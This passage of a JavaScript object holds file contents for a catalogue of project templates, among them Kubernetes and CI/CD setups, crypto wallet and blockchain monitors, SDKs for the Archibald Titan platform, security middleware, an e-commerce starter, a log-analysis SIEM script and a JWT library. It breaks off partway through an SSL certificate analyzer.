      "scripts/install.sh": `#!/bin/bash\nset -e\necho "[*] Installing Kubernetes Monitoring Stack"\nkubectl apply -f monitoring/namespace.yaml\nkubectl apply -f monitoring/prometheus-config.yaml\nkubectl apply -f monitoring/prometheus-deployment.yaml\nkubectl apply -f monitoring/grafana-deployment.yaml\necho "[+] Waiting for pods..."\nkubectl wait --for=condition=ready pod -l app=prometheus -n monitoring --timeout=120s\nkubectl wait --for=condition=ready pod -l app=grafana -n monitoring --timeout=120s\necho "[+] Done! Access Grafana: kubectl port-forward svc/grafana 3000:3000 -n monitoring"\n`,
    },

    // ── GitHub Actions CI/CD Template Pack ──────────────────────────────────────
    "cicd-templates": {
      "README.md": `# GitHub Actions CI/CD Template Pack\n\n20+ production-ready GitHub Actions workflows for Node, Python, Docker, Kubernetes, and security scanning.\n`,
      ".github/workflows/node-ci.yml": `name: Node.js CI\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: [18.x, 20.x, 21.x]\n    steps:\n      - uses: actions/checkout@v4\n      - name: Use Node.js \${{ matrix.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: \${{ matrix.node-version }}\n          cache: npm\n      - run: npm ci\n      - run: npm run build --if-present\n      - run: npm test\n`,
      ".github/workflows/docker-build-push.yml": `name: Docker Build & Push\non:\n  push:\n    branches: [main]\n    tags: ['v*']\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Log in to Docker Hub\n        uses: docker/login-action@v3\n        with:\n          username: \${{ secrets.DOCKERHUB_USERNAME }}\n          password: \${{ secrets.DOCKERHUB_TOKEN }}\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          push: true\n          tags: \${{ secrets.DOCKERHUB_USERNAME }}/myapp:latest,\${{ secrets.DOCKERHUB_USERNAME }}/myapp:\${{ github.sha }}\n`,
      ".github/workflows/security-scan.yml": `name: Security Scan\non:\n  push:\n    branches: [main]\n  schedule:\n    - cron: '0 6 * * 1'\njobs:\n  trivy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: fs\n          scan-ref: .\n          format: sarif\n          output: trivy-results.sarif\n      - name: Upload results\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: trivy-results.sarif\n  sast:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Initialize CodeQL\n        uses: github/codeql-action/init@v3\n        with:\n          languages: javascript,typescript\n      - name: Perform CodeQL Analysis\n        uses: github/codeql-action/analyze@v3\n`,
      ".github/workflows/deploy-railway.yml": `name: Deploy to Railway\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install Railway CLI\n        run: npm i -g @railway/cli\n      - name: Deploy\n        run: railway up --service \${{ secrets.RAILWAY_SERVICE }}\n        env:\n          RAILWAY_TOKEN: \${{ secrets.RAILWAY_TOKEN }}\n`,
    },

    // ── Crypto Wallet Tracker ────────────────────────────────────────────────────
    "wallet-tracker": {
      "README.md": `# Crypto Wallet Tracker Blueprint\n\nReal-time multi-chain wallet tracker with portfolio analytics and alert system.\n\n\`\`\`bash\nnpm install && npm run dev\n# Set ALCHEMY_KEY, MORALIS_KEY in .env\n\`\`\`\n`,
      "tracker.ts": `import axios from 'axios';\n\nconst CHAINS = {\n  ethereum: { rpc: \`https://eth-mainnet.g.alchemy.com/v2/\${process.env.ALCHEMY_KEY}\`, symbol: 'ETH' },\n  polygon:  { rpc: \`https://polygon-mainnet.g.alchemy.com/v2/\${process.env.ALCHEMY_KEY}\`, symbol: 'MATIC' },\n  bsc:      { rpc: 'https://bsc-dataseed.binance.org', symbol: 'BNB' },\n};\n\ninterface WalletData {\n  address: string;\n  chain: string;\n  balance: string;\n  usdValue: number;\n  tokens: Token[];\n}\n\ninterface Token {\n  symbol: string;\n  balance: string;\n  usdValue: number;\n}\n\nexport async function getWalletBalance(address: string, chain: string): Promise<WalletData> {\n  const { rpc, symbol } = CHAINS[chain as keyof typeof CHAINS] ?? CHAINS.ethereum;\n  const payload = { jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 };\n  const { data } = await axios.post(rpc, payload);\n  const balWei = BigInt(data.result ?? '0x0');\n  const balEth = Number(balWei) / 1e18;\n  return { address, chain, balance: balEth.toFixed(6), usdValue: 0, tokens: [] };\n}\n\nexport async function trackMultipleWallets(addresses: string[], chains: string[] = ['ethereum']) {\n  const results: WalletData[] = [];\n  for (const address of addresses) {\n    for (const chain of chains) {\n      try {\n        const data = await getWalletBalance(address, chain);\n        results.push(data);\n        console.log(\`[\${chain}] \${address.slice(0,6)}...\${address.slice(-4)}: \${data.balance} \${CHAINS[chain as keyof typeof CHAINS]?.symbol}\`);\n      } catch (e) { console.error(\`Error tracking \${address} on \${chain}:\`, e); }\n    }\n  }\n  return results;\n}\n`,
      ".env.example": `ALCHEMY_KEY=your_alchemy_api_key\nMORALIS_KEY=your_moralis_api_key\nALERT_WEBHOOK=https://your-webhook-url\n`,
      "package.json": `{\n  \"name\": \"wallet-tracker\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": { \"axios\": \"^1.6.0\", \"ws\": \"^8.14.0\" }\n}\n`,
    },

  
    // ── Titan Platform Extensions ────────────────────────────────────────────────
    "titan-builder": {
      "README.md": `# Titan Builder Pro Extension\n\nExtend the Archibald Titan platform with custom workflows, triggers, and automation.\n\n\`\`\`typescript\nimport { TitanBuilder } from '@archibald/builder-sdk';\nconst builder = new TitanBuilder({ apiKey: process.env.TITAN_API_KEY });\nawait builder.createWorkflow({ name: 'Daily Recon', steps: [...] });\n\`\`\`\n`,
      "src/index.ts": `export { TitanBuilder } from './TitanBuilder';\nexport { Workflow, Step, Trigger } from './types';\n`,
      "src/TitanBuilder.ts": `import axios, { AxiosInstance } from 'axios';\nimport type { Workflow, WorkflowRun, Trigger } from './types';\n\nexport class TitanBuilder {\n  private client: AxiosInstance;\n\n  constructor({ apiKey, baseUrl = 'https://archibaldtitan.com/api' }: { apiKey: string; baseUrl?: string }) {\n    this.client = axios.create({\n      baseURL: baseUrl,\n      headers: { 'X-API-Key': apiKey, 'Content-Type': 'application/json' },\n    });\n  }\n\n  async createWorkflow(workflow: Omit<Workflow, 'id' | 'createdAt'>): Promise<Workflow> {\n    const { data } = await this.client.post('/workflows', workflow);\n    return data;\n  }\n\n  async listWorkflows(): Promise<Workflow[]> {\n    const { data } = await this.client.get('/workflows');\n    return data.workflows;\n  }\n\n  async runWorkflow(id: string, inputs?: Record<string, unknown>): Promise<WorkflowRun> {\n    const { data } = await this.client.post(\`/workflows/\${id}/run\`, { inputs });\n    return data;\n  }\n\n  async getRunStatus(runId: string): Promise<WorkflowRun> {\n    const { data } = await this.client.get(\`/runs/\${runId}\`);\n    return data;\n  }\n\n  async createTrigger(trigger: Omit<Trigger, 'id'>): Promise<Trigger> {\n    const { data } = await this.client.post('/triggers', trigger);\n    return data;\n  }\n}\n`,
      "src/types.ts": `export interface Step {\n  id: string;\n  type: 'fetch' | 'transform' | 'ai' | 'webhook' | 'condition' | 'loop';\n  config: Record<string, unknown>;\n  on_success?: string;\n  on_failure?: string;\n}\nexport interface Workflow {\n  id: string;\n  name: string;\n  description?: string;\n  steps: Step[];\n  createdAt: string;\n}\nexport interface WorkflowRun {\n  id: string;\n  workflowId: string;\n  status: 'queued' | 'running' | 'completed' | 'failed';\n  startedAt?: string;\n  completedAt?: string;\n  outputs?: Record<string, unknown>;\n}\nexport interface Trigger {\n  id: string;\n  workflowId: string;\n  type: 'schedule' | 'webhook' | 'event';\n  config: Record<string, unknown>;\n}\n`,
      "package.json": `{\n  \"name\": \"@archibald/builder-sdk\",\n  \"version\": \"1.0.0\",\n  \"main\": \"dist/index.js\",\n  \"types\": \"dist/index.d.ts\",\n  \"dependencies\": { \"axios\": \"^1.6.0\" }\n}\n`,
    },

    "titan-security-pack": {
      "README.md": `# Titan Security Hardening Pack\n\nPre-built security configurations and hardening scripts deeply integrated with Archibald Titan.\n\n## What's Included\n- Express security middleware stack\n- CSP header configurator\n- Audit log integration\n- Session hardening\n- Rate limit presets\n`,
      "security/middleware.ts": `import helmet from 'helmet';\nimport rateLimit from 'express-rate-limit';\nimport type { Express } from 'express';\n\nexport function applyTitanSecurityMiddleware(app: Express) {\n  // Helmet — HTTP security headers\n  app.use(helmet({\n    contentSecurityPolicy: {\n      directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\"'self'\", \"'nonce-<NONCE>'\"  ],\n        styleSrc: [\"'self'\", \"'nonce-<NONCE>'\"],\n        imgSrc: [\"'self'\", 'data:', 'https:'],\n        connectSrc: [\"'self'\", 'https://archibaldtitan.com'],\n        frameSrc: [\"'none'\"],\n        objectSrc: [\"'none'\"],\n      },\n    },\n    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },\n    noSniff: true,\n    xssFilter: true,\n    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },\n  }));\n\n  // Global rate limiter\n  app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 500, standardHeaders: true }));\n  // Strict API rate limiter\n  app.use('/api', rateLimit({ windowMs: 60 * 1000, max: 100, standardHeaders: true }));\n  // Auth rate limiter\n  app.use('/api/auth', rateLimit({ windowMs: 15 * 60 * 1000, max: 20 }));\n  console.log('[Titan Security] Security middleware applied');\n}\n`,
      "security/csp-nonce.ts": `import { randomBytes } from 'crypto';\nimport type { Request, Response, NextFunction } from 'express';\n\nexport function cspNonceMiddleware(req: Request, res: Response, next: NextFunction) {\n  const nonce = randomBytes(16).toString('base64');\n  res.locals.cspNonce = nonce;\n  res.setHeader('Content-Security-Policy',\n    \`script-src 'self' 'nonce-\${nonce}'; style-src 'self' 'nonce-\${nonce}'; default-src 'self'; frame-ancestors 'none'\`);\n  next();\n}\n`,
    },

    "titan-chat-sdk": {
      "README.md": `# Titan Chat Plugin SDK\n\nBuild custom chat plugins that extend Archibald Titan's AI chat with your own tools and data.\n\n\`\`\`typescript\nimport { TitanChatPlugin } from '@archibald/chat-sdk';\nconst plugin = new TitanChatPlugin({ name: 'MyTool', apiKey: process.env.TITAN_KEY });\nplugin.addTool({ name: 'search_docs', description: 'Search internal docs', fn: mySearchFn });\nplugin.register();\n\`\`\`\n`,
      "src/TitanChatPlugin.ts": `export interface Tool {\n  name: string;\n  description: string;\n  parameters?: Record<string, { type: string; description: string; required?: boolean }>;\n  fn: (params: Record<string, unknown>) => Promise<string | object>;\n}\n\nexport class TitanChatPlugin {\n  private name: string;\n  private apiKey: string;\n  private baseUrl: string;\n  private tools: Map<string, Tool> = new Map();\n\n  constructor({ name, apiKey, baseUrl = 'https://archibaldtitan.com/api' }: { name: string; apiKey: string; baseUrl?: string }) {\n    this.name = name;\n    this.apiKey = apiKey;\n    this.baseUrl = baseUrl;\n  }\n\n  addTool(tool: Tool): this {\n    this.tools.set(tool.name, tool);\n    return this;\n  }\n\n  async handleToolCall(toolName: string, params: Record<string, unknown>): Promise<string> {\n    const tool = this.tools.get(toolName);\n    if (!tool) throw new Error(\`Unknown tool: \${toolName}\`);\n    const result = await tool.fn(params);\n    return typeof result === 'string' ? result : JSON.stringify(result, null, 2);\n  }\n\n  getToolDefinitions() {\n    return [...this.tools.values()].map(t => ({\n      name: t.name,\n      description: t.description,\n      parameters: t.parameters ?? {},\n    }));\n  }\n\n  async register(): Promise<void> {\n    console.log(\`[TitanChatPlugin] Registered plugin: \${this.name}\`);\n    console.log(\`[TitanChatPlugin] Tools: \${[...this.tools.keys()].join(', ')}\`);\n  }\n}\n`,
      "examples/weather-plugin.ts": `import { TitanChatPlugin } from '../src/TitanChatPlugin';\n\nconst plugin = new TitanChatPlugin({ name: 'WeatherPlugin', apiKey: process.env.TITAN_KEY! });\n\nplugin.addTool({\n  name: 'get_weather',\n  description: 'Get current weather for a city',\n  parameters: { city: { type: 'string', description: 'City name', required: true } },\n  fn: async ({ city }) => {\n    const res = await fetch(\`https://wttr.in/\${city}?format=j1\`);\n    const data = await res.json() as any;\n    const w = data.current_condition?.[0];\n    return \`Weather in \${city}: \${w?.weatherDesc?.[0]?.value}, \${w?.temp_C}°C\`;\n  },\n});\n\nplugin.register();\n`,
    },

    "titan-analytics": {
      "README.md": `# Titan Analytics Dashboard Module\n\nEmbed rich analytics charts into the Archibald Titan dashboard using your own data.\n\n\`\`\`typescript\nimport { TitanAnalytics } from './TitanAnalytics';\nconst analytics = new TitanAnalytics({ apiKey: process.env.TITAN_KEY });\nawait analytics.track('user.login', { userId: '123', country: 'US' });\n\`\`\`\n`,
      "src/TitanAnalytics.ts": `import axios from 'axios';\n\ninterface Event {\n  name: string;\n  properties?: Record<string, string | number | boolean>;\n  timestamp?: string;\n  userId?: string;\n  sessionId?: string;\n}\n\nexport class TitanAnalytics {\n  private apiKey: string;\n  private baseUrl: string;\n  private queue: Event[] = [];\n  private flushInterval: ReturnType<typeof setInterval>;\n\n  constructor({ apiKey, baseUrl = 'https://archibaldtitan.com/api' }: { apiKey: string; baseUrl?: string }) {\n    this.apiKey = apiKey;\n    this.baseUrl = baseUrl;\n    this.flushInterval = setInterval(() => this.flush(), 5000);\n  }\n\n  track(name: string, properties?: Record<string, string | number | boolean>, userId?: string) {\n    this.queue.push({ name, properties, userId, timestamp: new Date().toISOString() });\n    if (this.queue.length >= 50) this.flush();\n  }\n\n  page(path: string, userId?: string) {\n    this.track('page.view', { path }, userId);\n  }\n\n  identify(userId: string, traits?: Record<string, string | number | boolean>) {\n    this.track('user.identify', traits, userId);\n  }\n\n  async flush() {\n    if (this.queue.length === 0) return;\n    const batch = this.queue.splice(0);\n    try {\n      await axios.post(\`\${this.baseUrl}/analytics/batch\`,\n        { events: batch },\n        { headers: { 'X-API-Key': this.apiKey } }\n      );\n    } catch (e) { console.error('[TitanAnalytics] Flush failed:', e); }\n  }\n\n  destroy() { clearInterval(this.flushInterval); }\n}\n`,
    },

    "titan-whitelabel": {
      "README.md": `# Titan White-Label Kit\n\nRe-brand and customise the Archibald Titan platform for your own clients or product.\n\n## What's Included\n- Brand configuration system\n- Custom domain setup guide\n- Logo and colour token replacement\n- Email template customisation\n- Custom subdomain setup\n`,
      "config/brand.ts": `export interface BrandConfig {\n  name: string;\n  tagline: string;\n  primaryColour: string;\n  secondaryColour: string;\n  accentColour: string;\n  logoUrl: string;\n  faviconUrl: string;\n  domain: string;\n  supportEmail: string;\n  privacyUrl: string;\n  termsUrl: string;\n  footerLinks: Array<{ label: string; url: string }>;\n}\n\nexport const DEFAULT_BRAND: BrandConfig = {\n  name: 'Archibald Titan',\n  tagline: 'AI-Powered Security Intelligence',\n  primaryColour: '#10B981',\n  secondaryColour: '#1F2937',\n  accentColour: '#6EE7B7',\n  logoUrl: '/logo.svg',\n  faviconUrl: '/favicon.ico',\n  domain: 'archibaldtitan.com',\n  supportEmail: 'support@archibaldtitan.com',\n  privacyUrl: '/privacy',\n  termsUrl: '/terms',\n  footerLinks: [{ label: 'Documentation', url: '/docs' }, { label: 'Status', url: '/status' }],\n};\n\nexport function applyBrand(config: Partial<BrandConfig>): BrandConfig {\n  return { ...DEFAULT_BRAND, ...config };\n}\n`,
      "config/apply-brand.ts": `import { readFileSync, writeFileSync, readdirSync } from 'fs';\nimport { join } from 'path';\nimport type { BrandConfig } from './brand';\n\nexport function replaceBrandTokens(config: BrandConfig, srcDir: string) {\n  const replacements: [string, string][] = [\n    ['Archibald Titan', config.name],\n    ['archibaldtitan.com', config.domain],\n    ['support@archibaldtitan.com', config.supportEmail],\n    ['#10B981', config.primaryColour],\n    ['#1F2937', config.secondaryColour],\n  ];\n  const files = readdirSync(srcDir, { recursive: true }) as string[];\n  files.filter(f => f.match(/\\.(ts|tsx|css|html|json)$/)).forEach(f => {\n    const path = join(srcDir, f);\n    let content = readFileSync(path, 'utf-8');\n    replacements.forEach(([from, to]) => { content = content.replaceAll(from, to); });\n    writeFileSync(path, content);\n  });\n  console.log(\`[White-Label] Replaced brand tokens in \${files.length} files\`);\n}\n`,
      "guide/setup.md": `# White-Label Setup Guide\n\n## Step 1: Configure Your Brand\nEdit \`config/brand.ts\` with your brand values.\n\n## Step 2: Apply Brand Tokens\n\`\`\`typescript\nimport { applyBrand } from './config/brand';\nimport { replaceBrandTokens } from './config/apply-brand';\nconst brand = applyBrand({ name: 'YourBrand', domain: 'yourdomain.com' });\nreplaceBrandTokens(brand, './src');\n\`\`\`\n\n## Step 3: Custom Domain\nPoint your domain DNS to Railway and configure:\n1. Railway custom domain settings\n2. Update CORS_ORIGIN in .env\n3. Update SESSION_DOMAIN cookie setting\n`,
    },

    // ── Next.js E-Commerce Starter ────────────────────────────────────────────
    "nextjs-ecommerce": {
      "README.md": `# Next.js E-Commerce Starter\n\nFull-featured e-commerce starter with Next.js 14, Stripe, Prisma, and Tailwind.\n\n\`\`\`bash\nnpm install && npm run dev\n# Set DATABASE_URL, STRIPE_SECRET_KEY, NEXTAUTH_SECRET in .env.local\n\`\`\`\n`,
      "app/page.tsx": `import { ProductGrid } from '../components/ProductGrid';\nimport { getProducts } from '../lib/products';\n\nexport default async function Home() {\n  const products = await getProducts();\n  return (\n    <main className=\"max-w-6xl mx-auto px-4 py-8\">\n      <h1 className=\"text-3xl font-bold mb-8\">Products</h1>\n      <ProductGrid products={products} />\n    </main>\n  );\n}\n`,
      "components/ProductGrid.tsx": `'use client';\nimport React from 'react';\nimport { Product } from '../lib/types';\nimport { ProductCard } from './ProductCard';\n\nexport function ProductGrid({ products }: { products: Product[] }) {\n  return (\n    <div className=\"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6\">\n      {products.map(p => <ProductCard key={p.id} product={p} />)}\n    </div>\n  );\n}\n`,
      "components/ProductCard.tsx": `'use client';\nimport React from 'react';\nimport { Product } from '../lib/types';\n\nexport function ProductCard({ product }: { product: Product }) {\n  return (\n    <div className=\"border rounded-lg overflow-hidden shadow hover:shadow-md transition-shadow\">\n      <img src={product.imageUrl ?? '/placeholder.png'} alt={product.name} className=\"w-full h-48 object-cover\" />\n      <div className=\"p-4\">\n        <h3 className=\"font-semibold text-lg\">{product.name}</h3>\n        <p className=\"text-gray-500 text-sm mb-2\">{product.description}</p>\n        <div className=\"flex items-center justify-between\">\n          <span className=\"font-bold text-xl\">£{(product.priceGbp / 100).toFixed(2)}</span>\n          <button className=\"bg-black text-white px-4 py-2 rounded hover:bg-gray-800\">Add to Cart</button>\n        </div>\n      </div>\n    </div>\n  );\n}\n`,
      "lib/types.ts": `export interface Product { id: string; name: string; description: string; priceGbp: number; imageUrl?: string; slug: string; }\nexport interface CartItem { product: Product; quantity: number; }\nexport interface Order { id: string; items: CartItem[]; total: number; status: 'pending'|'paid'|'shipped'|'delivered'; createdAt: string; }\n`,
      "lib/stripe.ts": `import Stripe from 'stripe';\nexport const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, { apiVersion: '2023-10-16' });\nexport async function createCheckoutSession(items: import('./types').CartItem[], successUrl: string, cancelUrl: string) {\n  return stripe.checkout.sessions.create({\n    payment_method_types: ['card'],\n    line_items: items.map(i => ({\n      price_data: { currency: 'gbp', product_data: { name: i.product.name }, unit_amount: i.product.priceGbp },\n      quantity: i.quantity,\n    })),\n    mode: 'payment', success_url: successUrl, cancel_url: cancelUrl,\n  });\n}\n`,
      "package.json": `{\n  \"name\": \"nextjs-ecommerce\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"next\": \"^14.0.0\", \"react\": \"^18.2.0\", \"react-dom\": \"^18.2.0\",\n    \"stripe\": \"^14.0.0\", \"@prisma/client\": \"^5.0.0\"\n  }\n}\n`,
    },

    // ── Log Analysis & SIEM Lite ──────────────────────────────────────────────
    "siem-lite": {
      "README.md": `# Log Analysis & SIEM Lite\n\nReal-time log parsing, threat correlation, and alerting for small to mid-sized environments.\n\n\`\`\`bash\npython3 siem.py --input /var/log/auth.log --format syslog\npython3 siem.py --input nginx_access.log --format nginx --alert-webhook https://...\n\`\`\`\n`,
      "siem.py": `#!/usr/bin/env python3\nimport argparse, re, json, sys, requests\nfrom datetime import datetime\nfrom collections import defaultdict\n\nPATTERNS = {\n  'failed_login': re.compile(r'Failed password for (.+?) from (\\d+\\.\\d+\\.\\d+\\.\\d+)'),\n  'invalid_user': re.compile(r'Invalid user (.+?) from (\\d+\\.\\d+\\.\\d+\\.\\d+)'),\n  'sudo_cmd':     re.compile(r'sudo:.+COMMAND=(.+)'),\n  'accepted_key': re.compile(r'Accepted publickey for (.+?) from (\\d+\\.\\d+\\.\\d+\\.\\d+)'),\n  'root_login':   re.compile(r'Accepted .+ for root from (\\d+\\.\\d+\\.\\d+\\.\\d+)'),\n}\nNGINX_PATTERN = re.compile(r'(\\d+\\.\\d+\\.\\d+\\.\\d+).+"([A-Z]+) ([^ ]+).+" (\\d+) \\d+')\n\nclass SIEM:\n    def __init__(self, fmt: str, webhook: str = None):\n        self.fmt = fmt\n        self.webhook = webhook\n        self.events = []\n        self.ip_counts = defaultdict(int)\n        self.alerts = []\n\n    def parse_line(self, line: str) -> dict | None:\n        if self.fmt == 'syslog':\n            for name, pat in PATTERNS.items():\n                m = pat.search(line)\n                if m: return {'type': name, 'groups': m.groups(), 'raw': line.strip()}\n        elif self.fmt == 'nginx':\n            m = NGINX_PATTERN.search(line)\n            if m: return {'type': 'http_access', 'ip': m.group(1), 'method': m.group(2),\n                          'path': m.group(3), 'status': int(m.group(4)), 'raw': line.strip()}\n        return None\n\n    def analyse(self, events: list):\n        for e in events:\n            if e['type'] == 'failed_login':\n                ip = e['groups'][1] if len(e['groups']) > 1 else 'unknown'\n                self.ip_counts[ip] += 1\n                if self.ip_counts[ip] == 10:\n                    self.alert('BRUTE_FORCE', f'IP {ip} has {self.ip_counts[ip]} failed logins', 'HIGH')\n            if e['type'] == 'root_login':\n                ip = e['groups'][0] if e['groups'] else 'unknown'\n                self.alert('ROOT_LOGIN', f'Root login from {ip}', 'CRITICAL')\n            if e.get('type') == 'http_access' and e.get('status') in (401, 403):\n                self.ip_counts[e['ip']] += 1\n\n    def alert(self, name: str, detail: str, severity: str):\n        alert = {'name': name, 'detail': detail, 'severity': severity, 'ts': datetime.now().isoformat()}\n        self.alerts.append(alert)\n        print(f'[ALERT][{severity}] {name}: {detail}')\n        if self.webhook:\n            try: requests.post(self.webhook, json=alert, timeout=5)\n            except: pass\n\n    def run(self, input_file: str):\n        with open(input_file) as f:\n            for line in f:\n                e = self.parse_line(line)\n                if e: self.events.append(e)\n        self.analyse(self.events)\n        print(f'[+] Parsed {len(self.events)} events, {len(self.alerts)} alerts')\n        return {'events': len(self.events), 'alerts': self.alerts}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--input', required=True)\n    ap.add_argument('--format', choices=['syslog','nginx'], default='syslog')\n    ap.add_argument('--alert-webhook')\n    args = ap.parse_args()\n    siem = SIEM(args.format, args.alert_webhook)\n    result = siem.run(args.input)\n    with open('siem_report.json', 'w') as f: json.dump(result, f, indent=2)\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── JWT Authentication Library Hardened ─────────────────────────────────────
    "jwt-hardened": {
      "README.md": `# JWT Authentication Library — Hardened\n\nProduction-hardened JWT library with algorithm pinning, key rotation, and revocation support.\n\n\`\`\`typescript\nimport { JWTAuth } from './jwt-auth';\nconst auth = new JWTAuth({ secret: process.env.JWT_SECRET, algorithm: 'HS256' });\nconst token = await auth.sign({ userId: 42 }, { expiresIn: '1h' });\nconst payload = await auth.verify(token);\n\`\`\`\n`,
      "jwt-auth.ts": `import { SignJWT, jwtVerify, JWTPayload } from 'jose';\nimport { createHash, timingSafeEqual } from 'crypto';\n\ninterface JWTAuthConfig {\n  secret: string;\n  algorithm?: 'HS256' | 'HS384' | 'HS512';\n  issuer?: string;\n  audience?: string;\n}\n\nexport class JWTAuth {\n  private secret: Uint8Array;\n  private algorithm: 'HS256' | 'HS384' | 'HS512';\n  private issuer?: string;\n  private audience?: string;\n  private revokedSet = new Set<string>();\n\n  constructor(config: JWTAuthConfig) {\n    if (!config.secret || config.secret.length < 32)\n      throw new Error('JWT secret must be at least 32 characters');\n    this.secret = new TextEncoder().encode(config.secret);\n    this.algorithm = config.algorithm ?? 'HS256';\n    this.issuer = config.issuer;\n    this.audience = config.audience;\n  }\n\n  async sign(payload: Record<string, unknown>, opts: { expiresIn?: string } = {}): Promise<string> {\n    const builder = new SignJWT(payload as JWTPayload)\n      .setProtectedHeader({ alg: this.algorithm })\n      .setIssuedAt()\n      .setJti(createHash('sha256').update(Math.random().toString()).digest('hex').slice(0, 16));\n    if (this.issuer) builder.setIssuer(this.issuer);\n    if (this.audience) builder.setAudience(this.audience);\n    if (opts.expiresIn) builder.setExpirationTime(opts.expiresIn);\n    return builder.sign(this.secret);\n  }\n\n  async verify(token: string): Promise<JWTPayload> {\n    const { payload } = await jwtVerify(token, this.secret, {\n      algorithms: [this.algorithm],\n      ...(this.issuer && { issuer: this.issuer }),\n      ...(this.audience && { audience: this.audience }),\n    });\n    if (payload.jti && this.revokedSet.has(payload.jti))\n      throw new Error('Token has been revoked');\n    return payload;\n  }\n\n  revoke(jti: string) { this.revokedSet.add(jti); }\n\n  async refresh(token: string, opts?: { expiresIn?: string }): Promise<string> {\n    const payload = await this.verify(token);\n    if (payload.jti) this.revoke(payload.jti);\n    const { iat, exp, jti, ...claims } = payload;\n    return this.sign(claims, opts);\n  }\n}\n`,
      "package.json": `{\n  \"name\": \"jwt-hardened\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": { \"jose\": \"^5.0.0\" }\n}\n`,
    },

  
    // ── Blockchain Transaction Monitor ──────────────────────────────────────────
    "blockchain-monitor": {
      "README.md": `# Blockchain Transaction Monitor\n\nReal-time multi-chain transaction monitoring with alerts for suspicious activity.\n\n\`\`\`bash\nnpm install && npm run monitor -- --address 0x... --chains ethereum,polygon\n\`\`\`\n`,
      "monitor.ts": `import axios from 'axios';\nimport { EventEmitter } from 'events';\n\ninterface TxAlert { hash: string; from: string; to: string; value: string; chain: string; reason: string; }\n\nexport class BlockchainMonitor extends EventEmitter {\n  private apiKey: string;\n  private watching: Set<string> = new Set();\n  private thresholdEth: number;\n\n  constructor({ apiKey, thresholdEth = 10 }: { apiKey: string; thresholdEth?: number }) {\n    super();\n    this.apiKey = apiKey;\n    this.thresholdEth = thresholdEth;\n  }\n\n  watch(address: string) { this.watching.add(address.toLowerCase()); return this; }\n  unwatch(address: string) { this.watching.delete(address.toLowerCase()); return this; }\n\n  async getRecentTxs(address: string): Promise<any[]> {\n    const url = \`https://api.etherscan.io/api?module=account&action=txlist&address=\${address}&sort=desc&apikey=\${this.apiKey}&page=1&offset=20\`;\n    const { data } = await axios.get(url, { timeout: 10000 });\n    return data.result ?? [];\n  }\n\n  checkTx(tx: any, address: string): string | null {\n    const val = parseFloat(tx.value) / 1e18;\n    if (val >= this.thresholdEth) return \`High value transfer: \${val.toFixed(2)} ETH\`;\n    if (tx.to?.toLowerCase() === address && tx.from?.toLowerCase() === address) return 'Self-transfer (possible wash trading)';\n    return null;\n  }\n\n  async poll() {\n    for (const address of this.watching) {\n      const txs = await this.getRecentTxs(address);\n      for (const tx of txs.slice(0, 5)) {\n        const reason = this.checkTx(tx, address);\n        if (reason) {\n          const alert: TxAlert = { hash: tx.hash, from: tx.from, to: tx.to,\n            value: (parseFloat(tx.value) / 1e18).toFixed(4), chain: 'ethereum', reason };\n          this.emit('alert', alert);\n          console.log(\`[Monitor] ALERT: \${reason} — \${tx.hash.slice(0,10)}...\`);\n        }\n      }\n    }\n  }\n\n  start(intervalMs = 30000) {\n    console.log(\`[Monitor] Watching \${this.watching.size} addresses\`);\n    return setInterval(() => this.poll().catch(console.error), intervalMs);\n  }\n}\n`,
      "package.json": `{\n  \"name\": \"blockchain-monitor\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": { \"axios\": \"^1.6.0\" }\n}\n`,
    },

    // ── SSL/TLS Certificate Deep Analyzer ───────────────────────────────────────
    "ssl-analyzer": {
      "README.md": `# SSL/TLS Certificate Deep Analyzer\n\nAnalyse SSL/TLS certificates, ciphers, protocols, and vulnerabilities.\n\n\`\`\`bash\npython3 ssl_analyzer.py --host example.com --port 443\n\`\`\`\n`,
      "ssl_analyzer.py": `#!/usr/bin/env python3\nimport argparse, ssl, socket, json, datetime\nfrom cryptography import x509\nfrom cryptography.hazmat.backends import default_backend\n\ndef analyse_cert(host: str, port: int = 443) -> dict:\n    context = ssl.create_default_context()\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n    with socket.create_connection((host, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=host) as ssock:\n            protocol = ssock.version()\n            cipher = ssock.cipher()\n            cert_der = ssock.getpeercert(binary_form=True)\n    cert = x509.load_der_x509_certificate(cert_der, default_backend())\n    now = datetime.datetime.utcnow()\n    not_after = cert.not_valid_after\n    days_left = (not_after - now).days\n    findings = []\n    if protocol in ('TLSv1', 'TLSv1.1'): findings.append({'severity': 'HIGH', 'issue': f'Deprecated protocol: {protocol}'})\n    if days_left < 0: findings.append({'severity': 'CRITICAL', 'issue': 'Certificate EXPIRED'})\n    elif days_left < 14: findings.append({'severity': 'HIGH', 'issue': f'Certificate expires in {days_left} days'})\n    elif days_left < 30: findings.append({'severity': 'MEDIUM', 'issue': f'Certificate expires in {days_left} days'})\n    san_ext = None\n    for ext in 